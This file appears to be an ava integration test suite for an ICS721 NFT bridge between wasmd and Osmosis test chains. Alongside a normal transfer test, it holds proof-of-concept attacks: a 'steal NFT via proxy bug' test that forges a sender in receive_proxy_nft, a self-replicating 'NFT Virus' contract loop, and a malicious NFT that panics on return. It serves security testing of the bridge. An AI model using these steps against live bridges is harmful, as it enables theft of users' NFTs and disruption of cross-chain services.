import { CosmWasmSigner } from "@confio/relayer";
import anyTest, { ExecutionContext, TestFn } from "ava";
import { Order } from "cosmjs-types/ibc/core/channel/v1/channel";

import { instantiateContract } from "./controller";
import { mint, ownerOf, sendNft } from "./cw721-utils";
import {
  assertAckErrors,
  assertAckSuccess,
  ChannelInfo,
  ContractMsg,
  createIbcConnectionAndChannel,
  MNEMONIC,
  setupOsmosisClient,
  setupWasmClient,
  uploadAndInstantiate,
  uploadAndInstantiateAll,
} from "./utils";

interface TestContext {
  wasmClient: CosmWasmSigner;
  wasmAddr: string;

  osmoClient: CosmWasmSigner;
  osmoAddr: string;

  wasmCw721: string;
  wasmBridge: string;

  osmoBridge: string;

  channel: ChannelInfo;
}

const test = anyTest as TestFn<TestContext>;

const WASM_FILE_CW721_VIRUS = "./internal/cw721_virus.wasm";
const WASM_FILE_CW721 = "./internal/cw721_base_v0.15.0.wasm";
const WASM_FILE_CW_ICS721_BRIDGE = "./internal/cw_ics721_bridge.wasm";
const MALICIOUS_CW721 = "./internal/cw721_tester.wasm";

const standardSetup = async (t: ExecutionContext<TestContext>) => {
  t.context.wasmClient = await setupWasmClient(MNEMONIC);
  t.context.osmoClient = await setupOsmosisClient(MNEMONIC);

  t.context.wasmAddr = t.context.wasmClient.senderAddress;
  t.context.osmoAddr = t.context.osmoClient.senderAddress;

  const { wasmClient, osmoClient } = t.context;

  const wasmContracts: Record<string, ContractMsg> = {
    cw721: {
      path: WASM_FILE_CW721,
      instantiateMsg: {
        name: "ark",
        symbol: "ark",
        minter: wasmClient.senderAddress,
      },
    },
    ics721: {
      path: WASM_FILE_CW_ICS721_BRIDGE,
      instantiateMsg: undefined,
    },
  };
  const osmoContracts: Record<string, ContractMsg> = {
    cw721: {
      path: WASM_FILE_CW721,
      instantiateMsg: undefined,
    },
    ics721: {
      path: WASM_FILE_CW_ICS721_BRIDGE,
      instantiateMsg: undefined,
    },
  };

  const info = await uploadAndInstantiateAll(
    wasmClient,
    osmoClient,
    wasmContracts,
    osmoContracts
  );

  const wasmCw721Id = info.wasmContractInfos.cw721.codeId;
  const osmoCw721Id = info.osmoContractInfos.cw721.codeId;

  const wasmBridgeId = info.wasmContractInfos.ics721.codeId;
  const osmoBridgeId = info.osmoContractInfos.ics721.codeId;

  t.context.wasmCw721 = info.wasmContractInfos.cw721.address as string;

  t.log(`instantiating wasm bridge contract (${wasmBridgeId})`);

  const { contractAddress: wasmBridge } = await instantiateContract(
    wasmClient,
    wasmBridgeId,
    { cw721_base_code_id: wasmCw721Id },
    "label ics721"
  );
  t.context.wasmBridge = wasmBridge;

  t.log(`instantiating osmo bridge contract (${osmoBridgeId})`);

  const { contractAddress: osmoBridge } = await instantiateContract(
    osmoClient,
    osmoBridgeId,
    { cw721_base_code_id: osmoCw721Id },
    "label ics721"
  );
  t.context.osmoBridge = osmoBridge;

  const channelInfo = await createIbcConnectionAndChannel(
    wasmClient,
    osmoClient,
    wasmBridge,
    osmoBridge,
    Order.ORDER_UNORDERED,
    "ics721-1"
  );

  t.context.channel = channelInfo;

  t.pass();
};

test.serial("transfer NFT", async (t) => {
  t.assert(true);
  // return;
  await standardSetup(t);

  const {
    wasmClient,
    wasmAddr,
    wasmCw721,
    wasmBridge,
    osmoClient,
    osmoAddr,
    osmoBridge,
    channel,
  } = t.context;

  t.log(JSON.stringify(wasmClient, undefined, 2));
  const tokenId = "1";
  await mint(wasmClient, wasmCw721, tokenId, wasmAddr, undefined);

  // mint second token
  const secondTokenId = "2";
  await mint(wasmClient, wasmCw721, secondTokenId, wasmAddr, undefined);
  // assert token is minted
  let tokenOwner = await ownerOf(wasmClient, wasmCw721, tokenId);
  t.is(wasmAddr, tokenOwner.owner);

  for (const token of [tokenId, secondTokenId]) {
    const ibcMsg = {
      receiver: osmoAddr,
      channel_id: channel.channel.src.channelId,
      timeout: {
        block: {
          revision: 1,
          height: 90000,
        },
      },
    };

    t.log("transfering to osmo chain");

    const transferResponse = await sendNft(
      wasmClient,
      wasmCw721,
      wasmBridge,
      ibcMsg,
      token
    );
    t.truthy(transferResponse);
  }

  t.log("relaying packets");

  const info = await (async () => {
    while (btoa("1") == "MQ==") {
      try {
        const info = await channel.link.relayAll();
        return info;
      } catch (e) {
        console.log(e);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
    }
    throw new Error("bad");
  })();

  // Verify we got a success
  assertAckSuccess(info.acksFromB);

  // assert NFT on chain A is locked/owned by ICS contract
  tokenOwner = await ownerOf(wasmClient, wasmCw721, tokenId);
  t.is(wasmBridge, tokenOwner.owner);

  t.context.channel.channel.dest.channelId;

  const osmoClassId = `${t.context.channel.channel.dest.portId}/${t.context.channel.channel.dest.channelId}/${t.context.wasmCw721}`;
  const osmoCw721 = await osmoClient.sign.queryContractSmart(osmoBridge, {
    nft_contract: { class_id: osmoClassId },
  });

  tokenOwner = await ownerOf(osmoClient, osmoCw721, tokenId);
  t.is(osmoAddr, tokenOwner.owner);
});

test.serial("steal NFT via proxy bug", async (t) => {
  t.timeout(1000000);
  await standardSetup(t);

  const {
    wasmClient,
    wasmAddr,
    wasmCw721,
    wasmBridge,
    osmoClient,
    osmoAddr,
    osmoBridge,
    channel,
  } = t.context;

  t.log(JSON.stringify(wasmClient, undefined, 2));
  const tokenId = "1";
  await mint(wasmClient, wasmCw721, tokenId, wasmAddr, undefined);
  // assert token is minted
  let tokenOwner = await ownerOf(wasmClient, wasmCw721, tokenId);
  t.is(wasmAddr, tokenOwner.owner);

  const ibcMsg = {
    receiver: osmoAddr,
    channel_id: channel.channel.src.channelId,
    timeout: {
      block: {
        revision: 1,
        height: 90000,
      },
    },
  };

  t.log("transfering to osmo chain");

  const transferResponse = await sendNft(
    wasmClient,
    wasmCw721,
    wasmBridge,
    ibcMsg,
    tokenId
  );
  t.truthy(transferResponse);

  t.log("relaying packets");

  const info = await (async () => {
    while (btoa("1") == "MQ==") {
      try {
        const info = await channel.link.relayAll();
        return info;
      } catch (e) {
        console.log(e);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
    }
    throw new Error("bad");
  })();

  // Verify we got a success
  assertAckSuccess(info.acksFromB);

  // assert NFT on chain A is locked/owned by ICS contract
  tokenOwner = await ownerOf(wasmClient, wasmCw721, tokenId);
  t.is(wasmBridge, tokenOwner.owner);

  t.context.channel.channel.dest.channelId;

  const osmoClassId = `${t.context.channel.channel.dest.portId}/${t.context.channel.channel.dest.channelId}/${t.context.wasmCw721}`;
  const osmoCw721 = await osmoClient.sign.queryContractSmart(osmoBridge, {
    nft_contract: { class_id: osmoClassId },
  });

  tokenOwner = await ownerOf(osmoClient, osmoCw721, tokenId);
  t.is(osmoAddr, tokenOwner.owner);

  const THIEF_MNEMONIC =
    "offer despair fetch game nominee soon supply major neither hello tape shift arrow anchor primary opera gas weekend middle page picture auction ecology idea";
  // these are different accounts
  const thiefOsmoClient = await setupOsmosisClient(THIEF_MNEMONIC);
  t.not(thiefOsmoClient.senderAddress, osmoClient.senderAddress);

  const thiefWasmClient = await setupWasmClient(THIEF_MNEMONIC);

  // #[cw_serde]
  // pub struct IbcOutgoingMsg {
  //     /// The address that should receive the NFT being sent on the
  //     /// *receiving chain*.
  //     pub receiver: String,
  //     /// The *local* channel ID this ought to be sent away on. This
  //     /// contract must have a connection on this channel.
  //     pub channel_id: String,
  //     /// Timeout for the IBC message.
  //     pub timeout: IbcTimeout,
  //     /// Memo to add custom string to the msg
  //     pub memo: Option<String>,
  // }
  await thiefOsmoClient.sign.execute(
    thiefOsmoClient.senderAddress,
    osmoBridge,
    {
      receive_proxy_nft: {
        eyeball: osmoCw721,
        msg: {
          sender: osmoAddr,
          token_id: tokenId,
          msg: btoa(
            JSON.stringify({
              // ibc outgoing message
              receiver: thiefWasmClient.senderAddress,
              channel_id: channel.channel.dest.channelId,
              timeout: {
                block: {
                  revision: 1,
                  height:
                    (await thiefWasmClient.sign.getBlock()).header.height + 100,
                },
              },
            })
          ),
        },
      },
    },
    "auto"
  );
});

test.serial("NFT Virus", async (t) => {
  t.timeout(
    // five minutes
    1000 * 60 * 5
  );
  await standardSetup(t);
  const {
    wasmClient,
    wasmAddr,
    // wasmCw721,
    wasmBridge,
    osmoClient,
    osmoAddr,
    osmoBridge,
    channel,
  } = t.context;

  const wasmRes = await uploadAndInstantiate(wasmClient, {
    cw721_virus: {
      path: WASM_FILE_CW721_VIRUS,
      instantiateMsg: {
        name: "Virus",
        symbol: "virus",
        minter: wasmClient.senderAddress,
      },
    },
  });

  const wasmVirus = wasmRes.cw721_virus.address;

  const osmoRes = await uploadAndInstantiate(osmoClient, {
    cw721_virus: {
      path: WASM_FILE_CW721_VIRUS,
      instantiateMsg: {
        name: "Virus",
        symbol: "virus",
        minter: osmoClient.senderAddress,
      },
    },
  });

  const osmoVirus = osmoRes.cw721_virus.address;

  // update spike proteins on chain A and chain B cw721-virus contracts
  const updateSpikeProteinMsgs = {
    wasm721: {
      extension: {
        msg: {
          update_spike_proteins: {
            accomplice_src: osmoVirus,
            // accomplice_dst: we don't know this yet
            channel_id: channel.channel.src.channelId,
            bridge_contract: wasmBridge,
          },
        },
      },
    },
    osmo721: {
      extension: {
        msg: {
          update_spike_proteins: {
            accomplice_src: wasmVirus,
            // accomplice_dst: we don't know this yet
            channel_id: channel.channel.dest.channelId,
            bridge_contract: osmoBridge,
          },
        },
      },
    },
  };

  // update spike proteins on chain A cw721-virus contract
  await osmoClient.sign.execute(
    osmoClient.senderAddress,
    osmoVirus!,
    updateSpikeProteinMsgs.osmo721,
    "auto"
  );
  // update spike proteins on chain B cw721-virus contract
  await wasmClient.sign.execute(
    wasmClient.senderAddress,
    wasmVirus!,
    updateSpikeProteinMsgs.wasm721,
    "auto"
  );

  t.log("transferring nfts");

  const x = 5;
  for (let i = 0; i < x; i++) {
    await new Promise((resolve) => setTimeout(resolve, 1000));
    // const tokenId = "1";
    try {
      const res = await wasmClient.sign.execute(
        wasmAddr,
        wasmVirus!,
        {
          transfer_nft: {
            recipient: "doesntmatterwontbevalidated",
            token_id: "doesntmatterwontbevalidated",
          },
        },
        "auto"
      );
      t.truthy(res);
      t.log("transferred nft");
      const osmoRes = await osmoClient.sign.execute(
        osmoAddr,
        osmoVirus!,
        {
          transfer_nft: {
            recipient: "doesntmatterwontbevalidated",
            token_id: "doesntmatterwontbevalidated",
          },
        },
        "auto"
      );
      t.truthy(osmoRes);
      t.log("transferred second nft");
    } catch (e) {
      console.error(e);
      if (i == x - 1) {
        throw e;
      }
    }
  }

  t.log(
    "faux transfers have initiated ibc transfers to one another's counterparty chains"
  );

  t.log("relaying packets");

  // redundancy is needed, as resource constrictions can cause higher gas costs
  // and intermittent relayer failure
  const info = await (async () => {
    let tries = 5;
    let _info;
    while (btoa("1") == "MQ==") {
      try {
        const packets = await channel.link.getPendingPackets("A", {});
        const packets2 = await channel.link.getPendingPackets("B", {});
        t.log("packets", packets);
        t.log("packets2", packets2);
        console.log(
          "packets",
          JSON.stringify(
            packets.map((p) => p.packet.sequence),
            undefined,
            2
          )
        );
        console.log(
          "packets2",
          JSON.stringify(
            packets2.map((p) => p.packet.sequence),
            undefined,
            2
          )
        );
        const info = await channel.link.relayAll();
        _info = _info || info;
        _info.acksFromA = _info.acksFromA.concat(info.acksFromA);
        _info.acksFromB = _info.acksFromB.concat(info.acksFromB);
        if (tries-- <= 0) {
          return _info;
        }
      } catch (e) {
        console.log(e);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }
    }
    throw new Error("failed to relay packets");
  })();

  t.log("relayed packets");

  // Verify we got a success
  assertAckSuccess(info.acksFromB);
  assertAckSuccess(info.acksFromA);

  // assert NFT on chain A is locked/owned by ICS contract

  t.log("verifying NFTs are locked on chain A");
  const osmoClassId = `${t.context.channel.channel.dest.portId}/${t.context.channel.channel.dest.channelId}/${wasmVirus}`;
  const osmoCw721Voucher = await osmoClient.sign.queryContractSmart(
    osmoBridge,
    {
      nft_contract: { class_id: osmoClassId },
    }
  );

  t.log("verifying NFTs are locked on chain B");
  const wasmClassId = `${t.context.channel.channel.src.portId}/${t.context.channel.channel.src.channelId}/${osmoVirus}`;
  const wasmCw721Voucher = await wasmClient.sign.queryContractSmart(
    wasmBridge,
    {
      nft_contract: { class_id: wasmClassId },
    }
  );
  // next, we need to verify that the NFT vouchers are minted on either side of the bridge
  // and get the accomplice_dst address for each chain then update the spike proteins

  console.log({
    osmoCw721Voucher,
    wasmCw721Voucher,
    osmoVirus,
    wasmVirus,
  });
  t.log("updating spike proteins");

  // update spike proteins on chain A and chain B cw721-virus contracts
  const updateSpikeProteinMsgs2 = {
    wasm721: {
      extension: {
        msg: {
          update_spike_proteins: {
            accomplice_dst: wasmCw721Voucher,
          },
        },
      },
    },
    osmo721: {
      extension: {
        msg: {
          update_spike_proteins: {
            accomplice_dst: osmoCw721Voucher,
          },
        },
      },
    },
  };

  // update spike proteins on chain A cw721-virus contract
  await osmoClient.sign.execute(
    osmoClient.senderAddress,
    osmoVirus!,
    updateSpikeProteinMsgs2.osmo721,
    "auto"
  );
  // update spike proteins on chain B cw721-virus contract
  await wasmClient.sign.execute(
    wasmClient.senderAddress,
    wasmVirus!,
    updateSpikeProteinMsgs2.wasm721,
    "auto"
  );

  t.log("transferring back to osmo chain");

  // tokens in nft voucher contract
  const { tokens: wasmVoucherTokenIds } =
    await wasmClient.sign.queryContractSmart(wasmCw721Voucher, {
      tokens: {
        owner: wasmVirus,
        start_after: null,
        limit: 30,
      },
    });

  console.log(JSON.stringify({ wasmVoucherTokenIds }, null, 2));

  t.assert(wasmVoucherTokenIds, "voucher token id should exist");

  const { tokens: osmoVoucherTokenIds } =
    await osmoClient.sign.queryContractSmart(osmoCw721Voucher, {
      tokens: {
        owner: osmoVirus,
        start_after: null,
        limit: 30,
      },
    });

  console.log(JSON.stringify({ osmoVoucherTokenIds }, null, 2));

  await wasmClient.sign.execute(
    wasmAddr,
    wasmVirus!,
    {
      transfer_nft: {
        recipient: "doesntmatterwontbevalidated",
        token_id: "doesntmatterwontbevalidated",
      },
    },
    "auto"
  );

  await osmoClient.sign.execute(
    osmoAddr,
    osmoVirus!,
    {
      transfer_nft: {
        recipient: "doesntmatterwontbevalidated",
        token_id: "doesntmatterwontbevalidated",
      },
    },
    "auto"
  );

  t.log("relaying packets");

  t.log("relaying packets");

  const start = Date.now();
  await (async () => {
    while (start < Date.now() + 1000 * 60 * 5) {
      try {
        const res = await osmoClient.sign.queryContractSmart(osmoVirus!, {
          extension: {
            msg: {
              count: {},
            },
          },
        });
        console.log(JSON.stringify(res, null, 2));
      } catch (e) {
        continue;
      }
      await new Promise((resolve) => setTimeout(resolve, 500));
      try {
        const info = await channel.link.relayAll();
        // Verify we got a success
        assertAckSuccess(info.acksFromB);
        assertAckSuccess(info.acksFromA);
        const total = info.acksFromA.length + info.acksFromB.length;
        t.log(`relayed ${total} packets`);
        if (total == 0) {
          console.log("no packets relayed");
        }
      } catch (e) {
        continue;
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));
    }
    throw new Error("bad");
  })();

  t.log("relayed packets");
});

test.serial("malicious NFT", async (t) => {
  await standardSetup(t);

  const {
    wasmClient,
    osmoClient,
    channel,
    osmoAddr,
    wasmAddr,
    wasmBridge,
    osmoBridge,
  } = t.context;
  const tokenId = "1";

  const res = await uploadAndInstantiate(wasmClient, {
    cw721_gas_tester: {
      path: MALICIOUS_CW721,
      instantiateMsg: {
        name: "evil",
        symbol: "evil",
        minter: wasmClient.senderAddress,
        target: wasmBridge, // panic every time the bridge tries to return a NFT.
      },
    },
  });

  const cw721 = res.cw721_gas_tester.address as string;

  await mint(wasmClient, cw721, tokenId, wasmAddr, undefined);

  let ibcMsg = {
    receiver: osmoAddr,
    channel_id: channel.channel.src.channelId,
    timeout: {
      block: {
        revision: 1,
        height: 90000,
      },
    },
  };

  t.log("transfering to osmo chain");

  let transferResponse = await sendNft(
    wasmClient,
    cw721,
    wasmBridge,
    ibcMsg,
    tokenId
  );
  t.truthy(transferResponse);

  t.log("relaying packets");

  let info = await channel.link.relayAll();

  assertAckSuccess(info.acksFromB);

  const osmoClassId = `${t.context.channel.channel.dest.portId}/${t.context.channel.channel.dest.channelId}/${cw721}`;
  const osmoCw721 = await osmoClient.sign.queryContractSmart(osmoBridge, {
    nft_contract: { class_id: osmoClassId },
  });

  ibcMsg = {
    receiver: wasmAddr,
    channel_id: channel.channel.dest.channelId,
    timeout: {
      block: {
        revision: 1,
        height: 90000,
      },
    },
  };

  transferResponse = await sendNft(
    osmoClient,
    osmoCw721,
    osmoBridge,
    ibcMsg,
    tokenId
  );
  t.truthy(transferResponse);

  t.log("relaying packets");

  const pending = await channel.link.getPendingPackets("B");
  t.is(pending.length, 1);

  // Despite the transfer panicing, a fail ack should be returned.
  info = await channel.link.relayAll();
  assertAckErrors(info.acksFromA);
});
